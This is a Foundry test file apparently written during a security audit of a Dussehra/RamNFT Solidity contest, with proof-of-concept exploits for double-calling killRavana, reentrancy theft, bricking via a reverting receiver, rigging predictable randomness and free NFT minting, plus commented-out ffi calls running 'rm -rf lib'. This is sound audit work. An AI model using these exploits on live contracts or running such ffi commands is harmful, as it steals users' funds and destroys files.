// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {StdChains} from "forge-std/StdChains.sol";
import {Dussehra} from "../src/Dussehra.sol";
import {ChoosingRam} from "../src/ChoosingRam.sol";
// import { mock } from "../src/mocks/mock.sol";
import {RamNFT} from "../src/RamNFT.sol";

contract CounterTest is StdChains, Test {
    error Dussehra__NotEqualToEntranceFee();
    error Dussehra__AlreadyClaimedAmount();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();

    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;
    struct CharacteristicsOfRam {
        address ram;
        bool isJitaKrodhah;
        bool isDhyutimaan;
        bool isVidvaan;
        bool isAatmavan;
        bool isSatyavaakyah;
    }
    

    // mock cheatCodes = mock(VM_ADDRESS);
    address public organiser = makeAddr("organiser");
    address public player1 = makeAddr("player1");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");
    address public player4 = makeAddr("player4");

    function setUp() public {        
        // string memory rpc_url = vm.envString("ZKSYNC_RPC_URL"); 
        // uint256 forkId = vm.createFork(rpc_url);
        // vm.selectFork(forkId);

        // vm.startPrank(organiser);
        // ramNFT = new RamNFT();
        // choosingRam = new ChoosingRam(address(ramNFT));
        // dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));

        // ramNFT.setChoosingRamContract(address(choosingRam));
        // vm.stopPrank();

        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();

        vm.startPrank(player1); 
        dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
        vm.stopPrank();
    }
    // Dussehra contract tests

    function test_enterPeopleWhoLikeRam() public {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        assertEq(dussehra.peopleLikeRam(player1), true);
        assertEq(dussehra.WantToBeLikeRam(0), player1);
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.getCharacteristics(0).ram, player1);
        assertEq(ramNFT.getNextTokenId(), 1);
    }

    function test_enterPeopleWhoLikeRam_notEqualFee() public {
        vm.startPrank(player1);
        vm.deal(player1, 2 ether);

        vm.expectRevert(abi.encodeWithSelector(Dussehra__NotEqualToEntranceFee.selector));
        dussehra.enterPeopleWhoLikeRam{value: 2 ether}();
        vm.stopPrank();
    }

    // audit-info, out of scope? modifier should be before setup function
    modifier participants() {
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        _;
    }

    function test_increaseValuesOfParticipants() public participants {
        
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();
        
        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_increaseValuesOfParticipantsToSelectRam() public participants {
        
        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        choosingRam.increaseValuesOfParticipants(0, 1);
        vm.stopPrank();
        
        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, true);
    }

    function test_selectRamIfNotSelected() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        assertEq(choosingRam.isRamSelected(), true);
        assertEq(choosingRam.selectedRam(), player2);
    }

    function test_killRavana() public participants {

        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        assertEq(dussehra.IsRavanKilled(), true);
    }

    function test_killRavanaIfTimeToBeLikeRamIsNotFinish() public participants {
        
        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__TimeToBeLikeRamIsNotFinish.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

    }

    function test_killRavanaIfEventIsFinished() public participants {

        vm.warp(1728777600 + 1);
        
        vm.expectRevert(abi.encodeWithSelector(ChoosingRam__EventIsFinished.selector));
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

    }
    
    // £audit. Out of scope but will mention: WHAT THE FUCK?! -- is this to avoid zksync issue?!  
    // ok.. it is kind of funny. But also properly scary. It is possible to write to disk WITHOUT it being explicitly set in foundry.toml... 
    // function test_EverythingWorksFine() public {
    //     string[] memory cmds = new string[](3);
    //     cmds[0] = "rm"; 
    //     cmds[1] = "-rf";
    //     cmds[2] = "lib";
        
    //     cheatCodes.ffi(cmds);
    // }

    function test_withdraw() public participants {

        vm.warp(1728691200 + 1);
        
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        uint256 RamwinningAmount = dussehra.totalAmountGivenToRam();
        
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
        
        assertEq(player2.balance, RamwinningAmount);
    }

    function test_withdrawIfAlreadyClaimedAmount() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();

        vm.expectRevert(abi.encodeWithSelector(Dussehra__AlreadyClaimedAmount.selector));
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    // £audit. NOT COOL :D writing to host hard disk. 
    // function test_EverythingWorksFine1() public {
    //     string[] memory cmds = new string[](2);
    //     cmds[0] = "touch";
    //     cmds[1] = "1. You have been";
        
    //     cheatCodes.ffi(cmds);
    // }

    function test_withdrawIsOnlyCallableByRam() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();
        
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();

        vm.expectRevert("Only Ram can call this function!");
        vm.startPrank(player1);
        dussehra.withdraw();
        vm.stopPrank();
    }

    // function test_EverythingWorksFine2() public {
    //     string[] memory cmds = new string[](2);
    //     cmds[0] = "touch";
    //     cmds[1] = "2. Cursed By";
        
    //     cheatCodes.ffi(cmds);
    // }

    function test_withdrawIfRavanIsNotKilled() public participants {
        
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.expectRevert("Ravan is not killed yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    // function test_EverythingWorksFine3() public {
    //     string[] memory cmds = new string[](2);
    //     cmds[0] = "touch";
    //     cmds[1] = "3. Ravana";
        
    //     cheatCodes.ffi(cmds);
    // }

    function test_withdrawWhenRamIsNotSelected() public participants { 
        vm.expectRevert("Ram is not selected yet!");
        vm.startPrank(player2);
        dussehra.withdraw();
        vm.stopPrank();
    }

    // @dev: participants modifier adds two players to the protocol, both paying 1 ether entree fee. 
    function test_organiserGetsAllFundsByCallingKillRavanaTwice() public participants { 
        uint256 balanceDussehraStart = address(dussehra).balance;
        uint256 balanceOrganiserStart = organiser.balance;
        vm.assertEq(balanceDussehraStart, 2 ether); 

        // the organiser first has to select Ram.. 
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();

        vm.warp(1728691069 + 1);
        // notice that the killRavana function can be called by anyone. 
        vm.startPrank(player3);
        // calling it one time... 
        dussehra.killRavana();
        // calling it a second time... -- no revert happens.  
        dussehra.killRavana();
        vm.stopPrank();

        uint256 balanceDussehraEnd = address(dussehra).balance;
        uint256 balanceOrganiserEnd = organiser.balance;

        // And the balance of Dussehra is 0, the balance of organiser is 2. The organiser took all the funds. 
        vm.assertEq(balanceDussehraEnd, 0 ether);
        vm.assertEq(balanceOrganiserEnd, balanceOrganiserStart + balanceDussehraStart);

        // when withdraw is called it reverts: out of funds. 
        address selectedRam = choosingRam.selectedRam(); 
        vm.startPrank(selectedRam);
        vm.expectRevert();
        dussehra.withdraw();
        vm.stopPrank(); 

        // Add here line to show that withdraw reverts? 
    }

    // note: participants modifier adds two players to the protocol, both paying 1 ether entree fee. 
    function test_roundingErrorLeavesFundsInContract() public {
        // we start by setting up a dussehra contract with a fee that has value behind the comma. 
        uint256 entreeFee = 1 ether + 1; 
        vm.startPrank(organiser);
        Dussehra dussehraRoundingError = new Dussehra(entreeFee, address(choosingRam), address(ramNFT));
        vm.stopPrank();

        vm.startPrank(player1);
        vm.deal(player1, entreeFee);
        dussehraRoundingError.enterPeopleWhoLikeRam{value: entreeFee}();
        vm.stopPrank();

        // the organiser first has to select Ram.. 
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();

        // we call the killRavana function
        vm.warp(1728691069 + 1);
        vm.startPrank(player4);
        dussehraRoundingError.killRavana();
        vm.stopPrank();

        // and we call the withdraw function 
        address selectedRam = choosingRam.selectedRam(); 
        vm.startPrank(selectedRam);
        dussehraRoundingError.withdraw();
        vm.stopPrank(); 

        // there are funds left in the contract, meanwhile `totalAmountGivenToRam` has been reset to 0. 
        // the discrepency means that the difference will never be retrievable. 
        console.log("end balance dussehra:", address(dussehraRoundingError).balance); 
        assert(address(dussehraRoundingError).balance != 0); 
        assert(dussehraRoundingError.totalAmountGivenToRam() == 0);
    }

    function test_organiserCanChooseWinner() public participants {
        uint256 tokenThatShouldWin = 0;
        // check that player1 is owner of ramNFT token no. 0.  
        assertEq(ramNFT.getCharacteristics(tokenThatShouldWin).ram, player1);
        uint256 thisIsSoNotRandom = 99999; // should not initialise to 0. 

        uint256 j = 1;
        while (thisIsSoNotRandom != tokenThatShouldWin) {
            vm.warp(1728691200 + j);
            thisIsSoNotRandom = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;
            j++;
        }
        
        // when we reached the correct value, we run the selectRamIfNotSelected function. 
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();

        // player1, owner of ramNFT no 0 is selected the winner. 
        vm.assertEq(choosingRam.selectedRam(), player1); 
    }

    function test_organiserRevertOnReceivingFundsBreaksProtocol() public {
        OrganiserBreaksProtocol organiserBreaksProtocol; 
        Dussehra brickedDussehra; 
        organiserBreaksProtocol = new OrganiserBreaksProtocol(); 

        vm.startPrank(address(organiserBreaksProtocol));
        brickedDussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
        vm.stopPrank();
                
        // We enter participants with their entree fees. 
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        brickedDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        brickedDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        // the organiser first selects the Ram.. 
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); 

        // But when organiser calls killRavana, the function reverts. 
        vm.expectRevert(); 
        brickedDussehra.killRavana(); 
        vm.stopPrank();
    }

    function test_organiserReentryStealsFunds() public {    
        OrganiserReentersKillRavana organiserReenters; 
        Dussehra reenteredDussehra; 
        organiserReenters = new OrganiserReentersKillRavana(); 

        vm.startPrank(address(organiserReenters));
        reenteredDussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
        organiserReenters.setSelectedDussehra(reenteredDussehra);
        vm.stopPrank();
                
        // We enter participants with their entree fees. 
        vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        reenteredDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.startPrank(player2);
        vm.deal(player2, 1 ether);
        reenteredDussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();

        // At this point the Dussehra contract has the fees, the organiser has no funds. 
        uint256 balanceDussehraStart = address(reenteredDussehra).balance;
        uint256 balanceOrganiserStart = address(organiserReenters).balance;
        vm.assertEq(balanceDussehraStart, 2 ether); 
        vm.assertEq(balanceOrganiserStart, 0 ether); 

        // Then, the organiser first selects the Ram.. 
        vm.warp(1728691200 + 1);
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected(); 

        // then anyone calls the kill Ravana function.. 
        reenteredDussehra.killRavana(); 

        // and the organiser ends up with all the funds. 
        uint256 balanceDussehraEnd = address(dussehra).balance;
        uint256 balanceOrganiserEnd = address(organiserReenters).balance;

        vm.assertEq(balanceDussehraEnd, 0 ether);
        vm.assertEq(balanceOrganiserEnd, balanceOrganiserStart + balanceDussehraStart);
    }


    function test_organiserResetsCharacteristics() public participants {    
        OrganiserResetsRamNFTCharacteristics resetsAddressesContract; 
        resetsAddressesContract = new OrganiserResetsRamNFTCharacteristics(ramNFT);
        address selectedRam = choosingRam.selectedRam(); 

        // the `participants` modifier enters player1 and player2 to the protocol. 
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.ownerOf(1), player2);

        // The organiser also enters as one of the participants, ending up with token id 2.
        vm.startPrank(organiser);
        vm.deal(organiser, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        assertEq(ramNFT.ownerOf(2), organiser);

        // Then, the organiser changes the choosingRamContract to the malicious contract: resetsAddressesContract.
        vm.startPrank(organiser);
        ramNFT.setChoosingRamContract(address(resetsAddressesContract)); 

        // The contract resetsAddressesContract has a function - as the name suggests - to reset characteristics of a selected tokenId.
        // in this case token Id 2: the token Id owned by the organiser. 
        resetsAddressesContract.resetCharacteristics(2); 

        assertEq(ramNFT.getCharacteristics(2).isJitaKrodhah, true);
        assertEq(ramNFT.getCharacteristics(2).isDhyutimaan, true);
        assertEq(ramNFT.getCharacteristics(2).isVidvaan, true);
        assertEq(ramNFT.getCharacteristics(2).isAatmavan, true);
        assertEq(ramNFT.getCharacteristics(2).isSatyavaakyah, false);

        // the organiser changes the choosingRamContract to back to the correct contract: choosingRam.         
        vm.startPrank(organiser);
        ramNFT.setChoosingRamContract(address(choosingRam)); 
        
        uint256 i;  
        while (selectedRam == address(0)) {
            i++; 
            vm.warp(1728690000 + i); 
            choosingRam.increaseValuesOfParticipants(2, 1); 
            selectedRam = choosingRam.selectedRam(); 
        }
        vm.stopPrank(); 
        // if we increaseValuesOfParticipants between tokenId 1 and 2, is is almost a certainty that tokenId 2 will be selected as Ram, as it started with a huge head start. 
        vm.assertEq(selectedRam, organiser); 
    }

    function test_mintingFreeRamNFTs() public participants {
        uint256 amountRamNFTstoMint = 9999; 
    
        // player3 does a direct transfer of funds to the dussehra contract. This transfer does NOT revert. 
        vm.startPrank(player3);
        for (uint256 i; i < amountRamNFTstoMint; i++) {
            // notice that address check is also lacking in mintRamNFT: you can mint as many as you want. 
            ramNFT.mintRamNFT(player3); 
        }
        vm.stopPrank();

        // the organiser first has to select Ram.. 
        vm.warp(1728691200 + 1);
        vm.prank(organiser);
        choosingRam.selectRamIfNotSelected(); 
        // it is an almost certainty that player3 will win. 
        vm.assertEq(choosingRam.selectedRam(), player3); 
    }
    
    function test_selectRamIfNotSelected_AlwaysSelectsRam() public participants {
        address selectedRam;  
        
        // the organiser enters the protocol, in additional to player1 and player2.  
        vm.startPrank(organiser);
        vm.deal(organiser, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        // check that the organiser owns token id 2:
        assertEq(ramNFT.ownerOf(2), organiser);

        // player1 and player2 play increaseValuesOfParticipants against each other until one is selected. 
        vm.startPrank(player1);
        while (selectedRam == address(0)) {
            choosingRam.increaseValuesOfParticipants(0, 1);
            selectedRam = choosingRam.selectedRam(); 
        }
        // check that selectedRam is player1 or player2: 
        assert(selectedRam== player1 || selectedRam == player2); 
        
        // But when calling Dussehra.killRavana(), it reverts because isRamSelected has not been set to true.  
        vm.expectRevert("Ram is not selected yet!"); 
        dussehra.killRavana(); 
        vm.stopPrank(); 

        // Let the organiser predict when their own token will be selected through the (not so) random selectRamIfNotSelected function. 
        uint256 j;
        uint256 calculatedId; 
        while (calculatedId != 2) {
            j++; 
            vm.warp(1728691200 + j);
            calculatedId = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
        }
        // when the desired id comes up, the organiser calls `selectRamIfNotSelected`: 
        vm.startPrank(organiser); 
        choosingRam.selectRamIfNotSelected(); 
        vm.stopPrank();
        selectedRam = choosingRam.selectedRam();  

        // check that selectedRam is now the organiser: 
        assert(selectedRam == organiser); 
        // and we can call killRavana() without reverting: 
        dussehra.killRavana();  
    }

    // function test_whatHappensWithTwoOrganisers() public  {
    //     vm.startPrank(organiser);
    //     ramNFT = new RamNFT();
    //     choosingRam = new ChoosingRam(address(ramNFT));
    //     vm.stopPrank();

    //     vm.startPrank(player1); 
    //     dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    //     ramNFT.setChoosingRamContract(address(choosingRam));
    //     vm.stopPrank();

        
    // }

    //////////////////////////////////////
    //       FALSE POSITIVES            //
    //////////////////////////////////////

    // NB: FALSE POSITIVE. DIRECT TRANSFERS DO REVERT. 
    // function test_fundsSendToDussehraAreStuckForever() public participants {
    //     uint256 balanceDussehraBeforeDirectTransfer = address(dussehra).balance;
    //     uint256 amountToTransfer = 2 ether; 

    //     // player3 does a direct transfer of funds to the dussehra contract. This transfer does NOT revert. 
    //     vm.startPrank(player3);
    //     vm.deal(player3, 2 ether);
    //     (bool success, ) = address(dussehra).call{value: amountToTransfer}("");
    //     vm.stopPrank();
    //     uint256 balanceDussehraAfterDirectTransfer = address(dussehra).balance;
    //     // balance of the dussehra contract has indeed increased. 
    //     vm.assertEq(balanceDussehraAfterDirectTransfer, balanceDussehraBeforeDirectTransfer + amountToTransfer);

    //     // Now we try to retrieve all funds, by calling killRavana multiple times. 
    //     // the organiser first has to select Ram.. 
    //     vm.warp(1728691200 + 1);
    //     vm.startPrank(organiser);
    //     choosingRam.selectRamIfNotSelected(); 
    //     vm.stopPrank();

    //     vm.warp(1728691069 + 1);
    //     // notice that the killRavana function can be called by anyone. 
    //     vm.startPrank(player3);
    //     // calling it one time... 
    //     dussehra.killRavana();
    //     // calling it a second time... -- no revert happens.  
    //     dussehra.killRavana();
        
    //     // calling it a third time... -- function reverts: no more funds.  
    //     vm.expectRevert(); 
    //     dussehra.killRavana();
    //     vm.stopPrank();

    //     // // The selected Ram calls the withdraw function multiple times - each time it reverts due to lack of funds. 
    //     address selectedRam = choosingRam.selectedRam(); 
    //     vm.startPrank(selectedRam);
    //     // calling the function once.. 
    //     vm.expectRevert();
    //     dussehra.withdraw();
    //     // calling the function twice.. 
    //     vm.expectRevert();
    //     dussehra.withdraw();
    //     vm.stopPrank(); 

    //     // But: there is still ether in the contract! This amount equals the amount send directly to the contract by player3. 
    //     uint256 balanceDussehraEnd = address(dussehra).balance;
    //     assert(balanceDussehraEnd > 0);
    //     vm.assertEq(balanceDussehraEnd, amountToTransfer);
    // }

    
}


//////////////////////////////////////
//       HELPER CONTRACTS           //
//////////////////////////////////////


contract OrganiserBreaksProtocol {
    constructor() {}

    receive() external payable {
        revert ("This totally bricks the protocol"); 
    }
}

contract OrganiserReentersKillRavana {
    Dussehra selectedDussehra;

    constructor() {}

    function setSelectedDussehra (Dussehra _dussehra) public {
        selectedDussehra = _dussehra; 
    }

    // if there is enough balance in the Dussehra contract, it calls killRavana again on receiving funds. 
    receive() external payable {
        if (address(selectedDussehra).balance >= selectedDussehra.totalAmountGivenToRam()) 
        {
            selectedDussehra.killRavana(); 
        } 
    }
}

contract OrganiserResetsRamNFTCharacteristics {
    RamNFT selectedRamNFT;

    constructor(RamNFT _ramNFT) {
        selectedRamNFT = _ramNFT; 
    }

    function resetCharacteristics (uint256 tokenId) public {
        selectedRamNFT.updateCharacteristics(
            tokenId, true, true, true, true, false
        ); 
    }
}